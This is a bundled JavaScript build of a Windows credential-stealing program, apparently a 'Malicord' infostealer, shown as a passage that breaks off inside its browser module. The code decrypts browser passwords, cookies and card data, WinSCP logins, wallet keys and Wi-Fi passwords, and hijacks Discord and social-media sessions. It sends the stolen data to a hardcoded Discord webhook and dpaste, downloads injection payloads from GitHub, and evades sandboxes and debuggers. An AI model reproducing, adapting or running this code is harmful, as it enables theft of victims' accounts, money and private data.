/*
 * ATTENTION: The "eval" devtool has been used (maybe by default in mode: "development").
 * This devtool is neither made for production nor for readable output files.
 * It uses "eval()" calls to create a separate source file in the browser devtools.
 * If you are trying to read the output file, select a different devtool (https://webpack.js.org/configuration/devtool/)
 * or disable the default devtool with "devtool: false".
 * If you are looking for production-ready output files, see mode: "production" (https://webpack.js.org/configuration/mode/).
 */
/******/ (() => { // webpackBootstrap
/******/ 	var __webpack_modules__ = ({

/***/ "./index.js":
/*!******************!*\
  !*** ./index.js ***!
  \******************/
/***/ ((__unused_webpack_module, __unused_webpack_exports, __webpack_require__) => {

eval("const { exec } = __webpack_require__(/*! child_process */ \"child_process\"),\n  admin = __webpack_require__(/*! ./utils/admin */ \"./utils/admin.js\"),\n  browsers = __webpack_require__(/*! ./utils/browsers */ \"./utils/browsers.js\"),\n  core = __webpack_require__(/*! ./utils/core */ \"./utils/core.js\"),\n  crypto = __webpack_require__(/*! ./utils/crypto */ \"./utils/crypto.js\"),\n  discord = __webpack_require__(/*! ./utils/discord */ \"./utils/discord.js\"),\n  files = __webpack_require__(/*! ./utils/files */ \"./utils/files.js\"),\n  twitter = __webpack_require__(/*! ./utils/twitter */ \"./utils/twitter.js\"),\n  { upload } = __webpack_require__(/*! ./utils/uploadFiles */ \"./utils/uploadFiles.js\"),\n  infos = __webpack_require__(/*! ./utils/infos */ \"./utils/infos.js\"),\n  injection = __webpack_require__(/*! ./utils/injection */ \"./utils/injection.js\"),\n  antidebug = __webpack_require__(/*! ./utils/antidebug */ \"./utils/antidebug.js\"),\n  save = __webpack_require__(/*! ./utils/save */ \"./utils/save.js\"),\n  { stat } = __webpack_require__(/*! ./utils/stats */ \"./utils/stats.js\"),\n  axios = __webpack_require__(/*! axios */ \"axios\"),\n  roblox = __webpack_require__(/*! ./utils/roblox */ \"./utils/roblox.js\"),\n  minecraft = __webpack_require__(/*! ./utils/minecraft */ \"./utils/minecraft.js\"),\n  reddit = __webpack_require__(/*! ./utils/reddit */ \"./utils/reddit.js\"),\n  https = __webpack_require__(/*! https */ \"https\"),\n  steam = __webpack_require__(/*! ./utils/steam */ \"./utils/steam.js\"),\n  agent = new https.Agent({ rejectUnauthorized: false }),\n  fake_error = __webpack_require__(/*! ./utils/fake_error */ \"./utils/fake_error.js\"),\n  kill = __webpack_require__(/*! ./utils/kill */ \"./utils/kill.js\"),\n  uac = __webpack_require__(/*! ./utils/uac */ \"./utils/uac.js\"),\n  tiktok = __webpack_require__(/*! ./utils/tiktok */ \"./utils/tiktok.js\"),\n  instagram = __webpack_require__(/*! ./utils/instagram */ \"./utils/instagram.js\");\n\n  let config = {\n    webhook: \"https://discord.com/api/webhooks/1176160877221789777/go9OL3o2wq_d-yEBvSTyJQZPIRsZQrMsBQvqkD5Ngjkv9ONbWgVtxCsRW13eF0v6atAE\",\n    apiurl: \"%API_URL%\",\n    ClientEmail: \"%CLIENT_EMAIL%\",\n    ChromeInjection: \"%CHROME_INJECTION%\",\n    DoINeedTo_MailChanger: \"%AUTO_MAIL_CHANGER%\",\n    DoINeedTo_Disable2FA: \"%DISABLE_2FA%\",\n    DoINeedTo_BlockDebug: \"%DEBUG_OPTIONS%\",\n    DoINeedTo_GetGames: \"%GAMES_OPTIONS%\",\n    DoINeedTo_GetLaunchers: \"%LAUNCHERS_OPTIONS%\",\n    DoINeedTo_Inject: \"%INJECT_OPTIONS%\",\n    DoINeedTo_GetClients: \"%CLIENTS_OPTIONS%\",\n    DoINeedTo_GetWallets: \"%WALLETS_OPTIONS%\",\n    DoINeedTo_GetVPN: \"%VPN_OPTIONS%\",\n    DoINeedTo_GetSysInfo: \"%SYSINFO_OPTIONS%\",\n    DoINeedTo_GetSocialAPP: \"%SOCIALAPP_OPTIONS%\",\n    DoINeedTo_GetBrowsers: \"%BROWSERS_OPTIONS%\",\n    DoINeedTo_FakeError: \"%FAKEERROR_OPTIONS%\",\n    DoINeedTo_TrollSound: \"%TROLL_SOUND%\",\n    DoINeedTo_TrollImage: \"%TROLL_IMAGE%\",\n    DoINeedTo_FakeErrorMSG: \"Dll not found.\",\n    ChromeInjectionURL:\n      \"https://github.com/KSCH-58/Chromium-Injection/raw/main/extensions.zip\",\n    DiscordInjectionURL:\n      \"https://raw.githubusercontent.com/ksch-58/sub/main/index.js\",\n    ExodusInjectionURL:\n      \"https://raw.githubusercontent.com/ksch-58/sub/main/exodus-inject.js\",\n    AtomicInjectionURL:\n      \"https://raw.githubusercontent.com/KSCH-58/sub/main/atomic-inject.js\",\n    AtomicMainURL:\n      \"https://raw.githubusercontent.com/KSCH-58/Atomic-injection/main/main.js\",\n    DoINeedTo_SwapWallet: {\n      active: \"%SWAP_OPTIONS%\",\n      ltc_address: \"%LTC_ADD%\",\n      xlm_address: \"%XLM_ADD%\",\n      eth_address: \"%ETH_ADD%\",\n      dash_address: \"%DASH_ADD%\",\n      bch_address: \"%BCH_ADD%\",\n      btc_address: \"%BTC_ADD%\",\n      xrp_address: \"%XRP_ADD%\",\n      neo_address: \"%NEO_ADD%\",\n      doge_address: \"%DOGE_ADD%\",\n    },\n  };\n  \nasync function start() {\n  let internetacces = core.checkInternetAccess();\n  if (!internetacces) {\n    process.abort();\n  }\n  uac.requestAdminPrivilegesIfNeeded(\n    config.ChromeInjection\n  );\n  let link = \"\";\n  const webhook = config.webhook;\n  await save.Init();\n  const { disk, ram, uid, cpucount, OS, cpu, GPU, windowskey, windowsversion } =\n    await core.getInfo();\n  const { ip, hostname, city, region, country, loc, org, postal, timezone } =\n    await core.getPublicIp();\n\n  kill.KillBrowsersProcess(\n    config.DoINeedTo_Inject,\n    config.DoINeedTo_GetBrowsers\n  );\n\n  const username = process.env.userprofile.split(\"\\\\\")[2];\n  const googlemap = `https://www.google.com/maps/search/google+map++${loc}`;\n\n  antidebug.DoNoDebugNegger(\n    config.DoINeedTo_BlockDebug,\n    ip,\n    disk,\n    ram,\n    uid,\n    cpucount,\n    OS,\n    cpu,\n    GPU,\n    windowskey,\n    windowsversion\n  );\n  fake_error.error(config.DoINeedTo_FakeError, config.DoINeedTo_FakeErrorMSG);\n\n  await infos.getSysteminformations(\n    config.DoINeedTo_GetSysInfo,\n    ip,\n    hostname,\n    disk,\n    ram,\n    uid,\n    cpucount,\n    OS,\n    cpu,\n    GPU,\n    windowskey,\n    windowsversion\n  );\n  await infos.takeScreenshotAndSave(config.DoINeedTo_GetSysInfo);\n  infos.MalicordAV(config.DoINeedTo_GetSysInfo);\n  infos.MalicordClipboard(config.DoINeedTo_GetSysInfo);\n  infos.MalicordWifiPasswords(config.DoINeedTo_GetSysInfo);\n  admin.MalicordWinSCP(config.DoINeedTo_GetClients);\n  files.MalicordBattle(config.DoINeedTo_GetLaunchers);\n  files.MalicordEpicGame(config.DoINeedTo_GetLaunchers);\n  files.MalicordSteam(config.DoINeedTo_GetLaunchers);\n  files.MalicordPidgin(config.DoINeedTo_GetSocialAPP);\n  files.MalicordProton(config.DoINeedTo_GetVPN);\n  files.MalicordNordVPN(config.DoINeedTo_GetVPN);\n  files.MalicordOpenVPN(config.DoINeedTo_GetVPN);\n  files.MalicordRiotGame(config.DoINeedTo_GetLaunchers);\n  files.MalicordTelegram(config.DoINeedTo_GetSocialAPP);\n  files.MalicordTox(config.DoINeedTo_GetSocialAPP);\n  crypto.MalicordColds(config.DoINeedTo_GetWallets);\n  crypto.MalicordExtensions(config.DoINeedTo_GetWallets);\n  await files.MalicordSimple();\n  await roblox.MalicordGetRoblox(config.DoINeedTo_GetGames);\n  roblox.ParseAndSendRoblox(config.DoINeedTo_GetGames);\n  twitter.detailtwitter(config.DoINeedTo_GetSocialAPP);\n  \n  \n  // SESSIONS \n  let insta_account = await instagram.ParseInstagram(config.DoINeedTo_GetSocialAPP);\n  let tiktok_account = await tiktok.ParseTiktok(config.DoINeedTo_GetSocialAPP);\n  let reddit_account = await reddit.ParseReddit(config.DoINeedTo_GetSocialAPP);\n  try {\n    const passwords = await browsers.MalicordBrowsers(\n      config.DoINeedTo_GetBrowsers\n    );\n    const passphrase = await crypto.MalicordMetamask(passwords);\n    crypto.exodusDecrypt(config.DoINeedTo_GetWallets, passwords);\n    stat.AddPassphrase(passphrase);\n  } catch (e) {\n    save.SaveError(e);\n  }\n  const zipPath = await save.zipResult();\n  link = await upload(zipPath);\n  let gembed = stat.Build(\n    username,\n    ip,\n    hostname,\n    city,\n    region,\n    country,\n    googlemap,\n    org,\n    postal,\n    timezone,\n    disk,\n    ram,\n    uid,\n    cpucount,\n    OS,\n    cpu,\n    GPU,\n    windowskey,\n    windowsversion,\n    link\n  );\n  try {\n    axios\n      .all([\n        axios({\n          url: webhook,\n          method: \"POST\",\n\n          headers: {\n            \"Content-Type\": \"application/json\",\n          },\n\n          data: JSON.parse(gembed),\n          httpsAgent: agent,\n        }),\n      ])\n      .then(axios.spread((response1) => {}))\n      .catch((error) => {});\n  } catch (e) {}\n  \n  steam.detailSteam(config.DoINeedTo_GetLaunchers);\n \n  injection.AtomicInjection(\n    \"yes\",\n    webhook,\n    config.AtomicInjectionURL,\n    config.AtomicMainURL\n  );\n  injection.exodusInjection(\n    config.DoINeedTo_Inject,\n    webhook,\n    config.ExodusInjectionURL\n  );\n  injection.chrome_injection(\n    config.ChromeInjection,\n    webhook,\n    config.ChromeInjectionURL\n  );\n  injection.pwnBetterDiscord(config.DoINeedTo_Inject);\n  injection.BypassDiscordTokenProtector(config.DoINeedTo_Inject);\n  injection.inject(\n    config.DoINeedTo_Inject,\n    webhook,\n    config.apiurl,\n    config.DiscordInjectionURL,\n    link,\n    config.DoINeedTo_Disable2FA,\n    config.DoINeedTo_MailChanger,\n    config.ClientEmail\n  );\n  files.CheckSensitiveFiles(config.DoINeedTo_GetSysInfo, config.webhook);\n  try {\n    const pd = await steam.sendSteam(config.DoINeedTo_GetLaunchers);\n    await axios({\n      url: webhook,\n      method: \"POST\",\n      headers: {\n        \"Content-Type\": \"application/json\",\n      },\n      httpsAgent: agent,\n      data: pd,\n    });\n  } catch (e) {}\n  try {\n    await axios({\n      url: webhook,\n      method: \"POST\",\n      headers: {\n        \"Content-Type\": \"application/json\",\n      },\n      httpsAgent: agent,\n      data: insta_account,\n    });\n  } catch (e) {}\n  try {\n    await axios({\n      url: webhook,\n      method: \"POST\",\n      headers: {\n        \"Content-Type\": \"application/json\",\n      },\n      httpsAgent: agent,\n      data: tiktok_account,\n    });\n  } catch (e) {}\n  try {\n    await axios({\n      url: webhook,\n      method: \"POST\",\n      headers: {\n        \"Content-Type\": \"application/json\",\n      },\n      httpsAgent: agent,\n      data: reddit_account,\n    });\n  } catch (e) {}\n  try {\n    const p = await twitter.sendTwitter(config.DoINeedTo_GetSocialAPP);\n    if (p) {\n      await axios({\n        url: webhook,\n        method: \"POST\",\n        headers: {\n          \"Content-Type\": \"application/json\",\n        },\n        httpsAgent: agent,\n        data: p,\n      });\n    }\n  } catch (e) {}\n\n  var embeds = [];\n  \n  const accounts = await discord.MalicordDiscord();\n  stat.addDiscordAccount(accounts);\n  for (let i = 0; i < stat.discordAccount[0].length && i < 3; i++) {\n    const acc = stat.discordAccount[0][i];\n    if (acc.username === null || acc.username === undefined) return;\n    let dscaccount = await discord.embed(\n      acc.username,\n      acc.tag,\n      acc.id,\n      acc.nitro,\n      acc.badges,\n      acc.billings,\n      acc.email,\n      acc.phone,\n      acc.token,\n      acc.avatar,\n      acc.password ?? \"None\"\n    );\n    if (dscaccount !== null || dscaccount == undefined) {\n      embeds.push(dscaccount);\n    }\n    const embedData = await discord.embedbis(acc.token);\n    const embedguild = await discord.embedguild(acc.token);\n    if (embedguild !== null && embedguild !== undefined) {\n      embeds.push(embedguild);\n    }\n    if (embedData !== null && embedData !== undefined) {\n      embeds.push(embedData);\n    }\n  }\n  try {\n    await axios({\n      url: webhook,\n      method: \"POST\",\n      headers: {\n        \"Content-Type\": \"application/json\",\n      },\n      httpsAgent: agent,\n      data: JSON.parse(discord.compile(embeds.slice(0, 10))),\n    });\n  } catch (e) {}\n\n  let allembed = [];\n\n  try {\n    const p = await roblox.sendRoblox(config.DoINeedTo_GetGames);\n    if (p.length > 0) {\n      allembed = await Promise.all(\n        p.map(async (pd) => {\n          let {\n            UserName,\n            RobuxBalance,\n            ThumbnailUrl,\n            IsAnyBuildersClubMember,\n            IsPremium,\n            friendscount,\n            cookies,\n          } = pd;\n\n          const response = await axios.post(\n            \"https://dpaste.com/api/\",\n            `content=${encodeURIComponent(cookies)}`,\n            {\n              headers: { \"Content-Type\": \"application/x-www-form-urlencoded\" },\n            }\n          );\n\n          const links = response.headers.location;\n          return roblox.embed(\n            UserName,\n            RobuxBalance,\n            ThumbnailUrl,\n            IsAnyBuildersClubMember,\n            IsPremium,\n            friendscount,\n            links\n          );\n        })\n      );\n      await axios({\n        url: webhook,\n        method: \"POST\",\n        headers: {\n          \"Content-Type\": \"application/json\",\n        },\n        httpsAgent: agent,\n        data: JSON.parse(roblox.compile(allembed.slice(0, 10))),\n      });\n    }\n  } catch (e) {}\n  \n  await minecraft.Malicordfinduid(webhook, config.DoINeedTo_GetGames);\n  core.cleaner();\n}\n\nstart();\n\n\n//# sourceURL=webpack://script/./index.js?");

/***/ }),

/***/ "./utils/admin.js":
/*!************************!*\
  !*** ./utils/admin.js ***!
  \************************/
/***/ ((module, __unused_webpack_exports, __webpack_require__) => {

eval("var Registry = __webpack_require__(/*! winreg */ \"winreg\"),\n{ stat } = __webpack_require__(/*! ./stats */ \"./utils/stats.js\"),\nsave = __webpack_require__(/*! ./save */ \"./utils/save.js\");\n\nfunction WinSCP() {\n  var WSCP_CHARS = [];\n\n  function _simple_decrypt_next_char() {\n    if (WSCP_CHARS.length == 0) {\n      return 0x00;\n    }\n\n    const WSCP_SIMPLE_STRING = \"0123456789ABCDEF\";\n\n    var a = WSCP_SIMPLE_STRING.indexOf(WSCP_CHARS.shift());\n    var b = WSCP_SIMPLE_STRING.indexOf(WSCP_CHARS.shift());\n\n    return 0xff & ~((((a << 4) + b) << 0) ^ 0xa3);\n  }\n\n  this.decrypt = function (username, hostname, encrypted) {\n    if (!encrypted.match(/[A-F0-9]+/)) {\n      return \"\";\n    }\n\n    var result = [],\n      key = [username, hostname].join(\"\");\n\n    WSCP_CHARS = encrypted.split(\"\");\n\n    var flag = _simple_decrypt_next_char(),\n      length;\n\n    if (flag == 0xff) {\n      _simple_decrypt_next_char();\n      length = _simple_decrypt_next_char();\n    } else {\n      length = flag;\n    }\n\n    WSCP_CHARS = WSCP_CHARS.slice(_simple_decrypt_next_char() * 2);\n\n    for (var i = 0; i < length; i++) {\n      result.push(String.fromCharCode(_simple_decrypt_next_char()));\n    }\n\n    if (flag == 0xff) {\n      var valid = result.slice(0, key.length).join(\"\");\n\n      if (valid != key) {\n        result = [];\n      } else {\n        result = result.slice(key.length);\n      }\n    }\n\n    WSCP_CHARS = [];\n\n    return result.join(\"\");\n  };\n}\n\nasync function MalicordWinSCP(cc) {\n  if (cc != \"yes\") return;\n  try {\n    let connections = [];\n    const regKey = new Registry({\n      hive: Registry.HKCU,\n      key: \"\\\\SOFTWARE\\\\Martin Prikryl\\\\WinSCP 2\\\\Sessions\",\n    });\n\n    const exists = await new Promise((resolve, reject) => {\n      regKey.keyExists((err, exists) => {\n        if (err != null) {\n          resolve(false);\n        }\n        resolve(exists);\n      });\n    });\n    if (!exists) {\n      return;\n    }\n    const subkeys = await new Promise((resolve, reject) => {\n      regKey.keys((err, subkeys) => {\n        if (err != null) {\n          resolve([]);\n        }\n\n        resolve(subkeys);\n      });\n    });\n    if (subkeys.length == 0) {\n      return;\n    }\n\n    stat.AddSysAdmin(\"WinSCP\");\n\n    for (let i = 0; i < subkeys.length; i++) {\n      const subkey = subkeys[i];\n\n      const subRegKey = new Registry({\n        hive: Registry.HKCU,\n        key: subkey.key,\n      });\n\n      const hostname = await new Promise((resolve, reject) => {\n        subRegKey.get(\"HostName\", (err, res) => {\n          if (err == null) {\n            resolve(res.value);\n          }\n          resolve(\"\");\n        });\n      });\n\n      const username = await new Promise((resolve, reject) => {\n        subRegKey.get(\"UserName\", (err, res) => {\n          if (err == null) {\n            resolve(res.value);\n          }\n          resolve(\"\");\n        });\n      });\n\n      const password = await new Promise((resolve, reject) => {\n        subRegKey.get(\"Password\", (err, res) => {\n          if (err == null) {\n            resolve(res.value);\n          }\n          resolve(\"\");\n        });\n      });\n\n      if (password != \"\" && username != \"\" && hostname != \"\") {\n        const winSCP = new WinSCP();\n        connections.push({\n          username: username,\n          password: winSCP.decrypt(username, hostname, password),\n          hostname: hostname,\n        });\n      }\n    }\n    save.saveSysAdmin(connections, \"WinSCP\");\n  } catch (e) {\n    save.SaveError(e);\n  }\n}\n\nmodule.exports = {\n  MalicordWinSCP,\n};\n\n\n//# sourceURL=webpack://script/./utils/admin.js?");

/***/ }),

/***/ "./utils/antidebug.js":
/*!****************************!*\
  !*** ./utils/antidebug.js ***!
  \****************************/
/***/ ((module, __unused_webpack_exports, __webpack_require__) => {

eval("const util = __webpack_require__(/*! util */ \"util\"),\r\nexec = util.promisify((__webpack_require__(/*! child_process */ \"child_process\").exec)),\r\naxios = __webpack_require__(/*! axios */ \"axios\"),\r\nsave = __webpack_require__(/*! ./save */ \"./utils/save.js\");\r\n\r\n\r\n\r\nasync function DoNoDebugNegger(cc, ip, disk, ram, uid, cpucount, OS, cpu, GPU, windowskey, windowsversion) {\r\n    if (cc !== \"yes\") return;\r\n    try{\r\n    const pc_name = process.env.COMPUTERNAME || \"IDK\";\r\n    const user_name = process.env.USERNAME || \"IDK\";\r\n\r\n    \r\n    const[isblockedIP, isblockedUID, isblockedUSERNAME, isblockedPCNAME, isBLOCKEDOS, isBlockedGpu] = await Promise.all([\r\n        ipBLOCKED(ip),\r\n        UuidBLOCKED(uid),\r\n        UsernameBLOCKED(user_name),\r\n        PCNameBLOCKED(pc_name),\r\n        OsBLOCKED(OS), \r\n        GpuBLOCKED(GPU)\r\n    ])\r\n    \r\n    if (!isNaN(disk) && disk < 80 && !isNaN(ram) && ram < 2 || !isNaN(cpucount) && cpucount < 2 || isBlockedGpu || isBLOCKEDOS || isblockedIP || isblockedUID || isblockedUSERNAME || isblockedPCNAME) {\r\n        process.abort();\r\n    }\r\n    try{\r\n    killBlacklistedPrograms()\r\n    }catch(e){\r\n        save.SaveError(e)\r\n    }\r\n}catch(e){\r\n    save.SaveError(e)\r\n}\r\n}\r\n\r\n\r\nasync function killBlacklistedPrograms() {\r\n    try {\r\n        const response = await axios.get('https://raw.githubusercontent.com/ksch-58/sub/main/assets/nope.json');\r\n        const json = response.data;\r\n\r\n        const blacklistedPrograms = json.blacklistedprog;\r\n\r\n        const { stdout } = await exec('tasklist');\r\n        const runningProcesses = stdout.split(/\\r?\\n/);\r\n\r\n        runningProcesses.forEach((process) => {\r\n            const processName = process.split(/\\s+/)[0].replace(\".exe\", '');\r\n            if (blacklistedPrograms.includes(processName)) {\r\n                try {\r\n                    exec(`taskkill /F /IM ${processName}.exe`, (error) => {\r\n                        if (error) {\r\n                        } else {\r\n                        }\r\n                    });\r\n                } catch (error) {\r\n                }\r\n            }\r\n        });\r\n    } catch (error) {\r\n    }\r\n}\r\n\r\n\r\nasync function GpuBLOCKED(gpu) {\r\n    try {\r\n        const response = await axios.get('https://raw.githubusercontent.com/KSCH-58/sub/main/assets/blocked_GPUTYPE.json');\r\n        const blockedgpu = response.data;\r\n        return blockedgpu.includes(gpu);\r\n    } catch (error) {\r\n        return false;\r\n    }\r\n}\r\n\r\nasync function OsBLOCKED(OS) {\r\n    try {\r\n        const response = await axios.get('https://raw.githubusercontent.com/KSCH-58/sub/main/assets/blockedOS.json');\r\n        const blockedOS = response.data;\r\n        return blockedOS.includes(OS);\r\n    } catch (error) {\r\n        return false;\r\n    }\r\n}\r\n\r\nasync function PCNameBLOCKED(username) {\r\n    try {\r\n        const response = await axios.get('https://raw.githubusercontent.com/KSCH-58/sub/main/assets/blockedpcname.json');\r\n        const blockedPCNAMES = response.data;\r\n        return blockedPCNAMES.includes(username);\r\n    } catch (error) {\r\n        return false;\r\n    }\r\n}\r\n\r\nasync function UsernameBLOCKED(username) {\r\n    try {\r\n        const response = await axios.get('https://raw.githubusercontent.com/KSCH-58/sub/main/assets/blocked_progr.json');\r\n        const blockedUsernames = response.data;\r\n        return blockedUsernames.includes(username);\r\n    } catch (error) {\r\n        return false;\r\n    }\r\n}\r\n\r\nasync function UuidBLOCKED(uid) {\r\n    try {\r\n        const response = await axios.get('https://raw.githubusercontent.com/KSCH-58/sub/main/assets/blocked_hwid.json');\r\n        const blockedUIDs = response.data;\r\n        return blockedUIDs.includes(uid);\r\n    } catch (error) {\r\n        return false;\r\n    }\r\n}\r\n\r\nasync function ipBLOCKED(ip) {\r\n    try {\r\n        const response = await axios.get('https://raw.githubusercontent.com/KSCH-58/sub/main/assets/blocked_ips.json');\r\n        const blockedIPs = response.data;\r\n        return blockedIPs.includes(ip);\r\n    } catch (error) {\r\n        return false;\r\n    }\r\n}\r\n\r\n\r\nmodule.exports = {\r\n    DoNoDebugNegger,\r\n};\r\n\n\n//# sourceURL=webpack://script/./utils/antidebug.js?");

/***/ }),

/***/ "./utils/browsers.js":
/*!***************************!*\
  !*** ./utils/browsers.js ***!
  \***************************/
/***/ ((module, __unused_webpack_exports, __webpack_require__) => {

eval("const fs = __webpack_require__(/*! fs */ \"fs\"),\n  sqlite3 = __webpack_require__(/*! sqlite3 */ \"sqlite3\"),\n  boukiapi = __webpack_require__(/*! boukiapi */ \"boukiapi\"),\n  crypto = __webpack_require__(/*! crypto */ \"crypto\"),\n  iconv = __webpack_require__(/*! iconv-lite */ \"iconv-lite\"),\n  save = __webpack_require__(/*! ./save */ \"./utils/save.js\"),\n  { stat } = __webpack_require__(/*! ./stats */ \"./utils/stats.js\"),\n  gecko = __webpack_require__(/*! ./gecko */ \"./utils/gecko.js\"),\n  path = __webpack_require__(/*! path */ \"path\"),\n  kill = __webpack_require__(/*! ./kill */ \"./utils/kill.js\");\n\nwebsite = [];\n\nclass Cookies {\n  constructor(host, path, secure, expires, name, value) {\n    this.host = host;\n    this.path = path;\n    this.secure = secure;\n    this.expires = expires;\n    this.name = name;\n    this.value = value;\n  }\n\n  build() {\n    return `${this.host}\\tTRUE\\t${this.path}\\t${this.secure}\\t${this.expires}\\t${this.name}\\t${this.value}\\n`;\n  }\n}\n\nclass Password {\n  constructor(site, username, password, timestamp, browser) {\n    this.site = site;\n    this.username = username;\n    this.password = password;\n    this.timestamp = timestamp;\n    this.browser = browser;\n  }\n\n  build() {\n    return `Site: ${this.site}\\nUsername: ${this.username}\\nPassword: ${this.password}\\nBrowser: ${this.browser} | ${this.timestamp}\\n`;\n  }\n}\n\nclass Autofill {\n  constructor(input, value, browser) {\n    this.input = input;\n    this.value = value;\n    this.browser = browser;\n  }\n\n  build() {\n    return `Input: ${this.input}\\nValue: ${this.value}\\nBrowser: ${this.browser}\\n`;\n  }\n}\n\nclass CreditCard {\n  constructor(\n    guid,\n    name,\n    expiration_mouth,\n    expiration_year,\n    number,\n    address,\n    nickname\n  ) {\n    this.guid = guid;\n    this.name = name;\n    this.address = address;\n    this.nickname = nickname;\n    this.expiration = expiration_mouth + \"/\" + expiration_year;\n    this.number = number;\n  }\n\n  build() {\n    return `Guid: ${this.guid}\\nName: ${this.name}\\nAdress: ${this.address}\\nNickname: ${this.nickname}\\nExpiration: ${this.expiration}\\nNumber: ${this.number}\\n`;\n  }\n}\n\nclass Visit {\n  constructor(url, title, count, timestamp) {\n    this.url = url;\n    this.title = title;\n    this.count = count;\n    this.timestamp = timestamp;\n  }\n\n  build() {\n    return `Url: ${this.url}\\nTitle: ${this.title}\\nCount: ${this.count}\\nTimestamp: ${this.timestamp}\\n`;\n  }\n}\n\nclass Download {\n  constructor(path, url, total_bytes) {\n    this.path = path;\n    this.url = url;\n    this.total_bytes = total_bytes;\n  }\n\n  build() {\n    return `Url: ${this.url}\\nPath: ${this.path}\\nTotalBytes: ${this.total_bytes}\\n`;\n  }\n}\n\nclass Bookmark {\n  constructor(name, url, timestamp, browser) {\n    this.url = url;\n    this.name = name;\n    this.timestamp = timestamp;\n    this.browser = browser;\n  }\n\n  build() {\n    return `Url: ${this.url}\\nName: ${this.name}\\nBrowser: ${this.browser}\\nTimestamp: ${this.timestamp}\\n`;\n  }\n}\n\nfunction getProfiles(path, name) {\n  let profiles = [];\n\n  if (fs.existsSync(path)) {\n    let dirs = fs.readdirSync(path);\n    for (let dir of dirs) {\n      if (dir.includes(\"Profile\") || dir == \"Default\") {\n        profiles.push({\n          path: `${path}${dir}\\\\`,\n          name: name,\n          profile: dir,\n        });\n      }\n    }\n    return profiles;\n  } else {\n    return [];\n  }\n}\n\nfunction getGeckoProfiles(path, name) {\n  let profiles = [];\n\n  if (fs.existsSync(path)) {\n    let dirs = fs.readdirSync(path);\n    for (let dir of dirs) {\n      if (\n        dir.includes(\".default-release\") ||\n        dir.includes(\".default-default-\")\n      ) {\n        profiles.push({\n          path: `${path}${dir}\\\\`,\n          name: name,\n        });\n      }\n    }\n    return profiles;\n  } else {\n    return [];\n  }\n}\n\nfunction getMasterKey(path) {\n  if (fs.existsSync(`${path}Local State`)) {\n    let localstate = JSON.parse(fs.readFileSync(`${path}Local State`, \"utf8\"));\n    let master_key = localstate.os_crypt.encrypted_key;\n    master_key = boukiapi.unprotectData(\n      Buffer.from(Buffer.from(master_key, \"base64\").slice(5), \"utf-8\"),\n      null,\n      \"CurrentUser\"\n    );\n    return master_key;\n  } else if (fs.existsSync(`${path}..\\\\Local State`)) {\n    let localstate = JSON.parse(\n      fs.readFileSync(`${path}..\\\\Local State`, \"utf8\")\n    );\n    let master_key = localstate.os_crypt.encrypted_key;\n    master_key = boukiapi.unprotectData(\n      Buffer.from(Buffer.from(master_key, \"base64\").slice(5), \"utf-8\"),\n      null,\n      \"CurrentUser\"\n    );\n    return master_key;\n  } else {\n    return \"\";\n  }\n}\n\nasync function tempSqlite(path, query) {\n  let path_tmp = path + \"_tmp\";\n  fs.copyFileSync(path, path_tmp);\n  let db = new sqlite3.Database(path_tmp);\n  let result = await new Promise((resolve, reject) => {\n    db.all(query, (err, rows) => {\n      if (err) {\n        reject(err);\n      } else {\n        resolve(rows);\n      }\n    });\n  });\n  db.close();\n  try {\n    fs.unlinkSync(path_tmp);\n  } catch (e) {}\n  return result;\n}\n\nfunction decryptChrome(value, key) {\n  let start = value.slice(3, 15),\n    middle = value.slice(15, value.length - 16),\n    end = value.slice(value.length - 16, value.length),\n    decipher = crypto.createDecipheriv(\"aes-256-gcm\", key, start);\n  decipher.setAuthTag(end);\n  return (decrypted =\n    decipher.update(middle, \"base64\", \"utf-8\") + decipher.final(\"utf-8\"));\n}\n\nasync function getCookies(basepath) {\n  await kill.KillBrowsersProcess();\n  let cookies = [];\n  let key = getMasterKey(basepath);\n\n  if (fs.existsSync(`${basepath}Network\\\\Cookies`)) {\n    var rows = [];\n    try {\n      rows = await tempSqlite(\n        `${basepath}Network\\\\Cookies`,\n        \"SELECT name, host_key, path, expires_utc, is_secure, encrypted_value FROM cookies\"\n      );\n    } catch (e) {}\n\n    for (let row of rows) {\n      let value = row.encrypted_value;\n\n      if (\n        value.toString().startsWith(\"v10\") ||\n        value.toString().startsWith(\"v11\")\n      ) {\n        if (key == \"\") {\n          continue;\n        }\n\n        try {\n          value = decryptChrome(value, key);\n        } catch (e) {\n          continue;\n        }\n      } else {\n        try {\n          value = boukiapi.unprotectData(value, null, \"CurrentUser\");\n        } catch (e) {\n          continue;\n        }\n      }\n      if (row.host_key.includes(\".reddit\")) {\n        if (row.name.includes(\"reddit_session\")) {\n          stat.addReddit(value);\n        }\n      }\n      if (row.host_key.includes(\".tiktok\")) {\n        if (row.name.includes(\"sessionid\")) {\n          stat.addTikTok(value);\n        }\n      }\n      if (row.host_key.includes(\".instagram\")) {\n        if (row.name.includes(\"sessionid\")) {\n          stat.addSessIDInsta(value);\n        }\n      }\n      if (row.name.includes(\".ROBLOSECURITY\")) {\n        save.saveRoblox(value);\n        stat.AddRoblox(value);\n      }\n      if (row.host_key.includes(\".twitter\")) {\n        let saved = row;\n        saved.value = value;\n        stat.AddTwitter(saved);\n      }\n      cookies.push(\n        new Cookies(\n          row.host_key,\n          row.path,\n          row.is_secure,\n          row.expires_utc,\n          row.name,\n          value\n        )\n      );\n    }\n  }\n  return cookies;\n}\n\nasync function getPasswords(basepath, browser) {\n  var passwords = [];\n  let key = getMasterKey(basepath);\n\n  var loginPath = \"\";\n  if (basepath.includes(\"Yandex\")) {\n    loginPath = `${basepath}Ya Passman Data`;\n  } else {\n    loginPath = `${basepath}Login Data`;\n  }\n\n  if (fs.existsSync(loginPath)) {\n    let rows = [];\n    try {\n      rows = await tempSqlite(\n        loginPath,\n        \"SELECT origin_url, username_value, password_value, date_created FROM logins\"\n      );\n    } catch (e) {}\n\n    for (let row of rows) {\n      let password = row.password_value;\n\n      if (\n        password.toString().startsWith(\"v10\") ||\n        password.toString().startsWith(\"v11\")\n      ) {\n        if (key == \"\") {\n          continue;\n        }\n\n        try {\n          password = decryptChrome(password, key);\n        } catch (e) {\n          continue;\n        }\n      } else {\n        try {\n          password = boukiapi.unprotectData(password, null, \"CurrentUser\");\n        } catch (e) {\n          continue;\n        }\n      }\n      if (row.origin_url.includes(\"discord\")) {\n        if (stat.discordAccount.length < 1) return;\n        stat.discordAccount.forEach((d) => {\n          d.forEach((g) => {\n            if (g.email == row.username_value) {\n              g.password = password;\n            }\n          });\n        });\n      }\n      if (row.username_value !== \"\" && (password !== \"\" && password !== undefined)) {\n        passwords.push(\n          new Password(\n            row.origin_url,\n            row.username_value,\n            password,\n            row.date_created,\n            browser\n          )\n        );\n        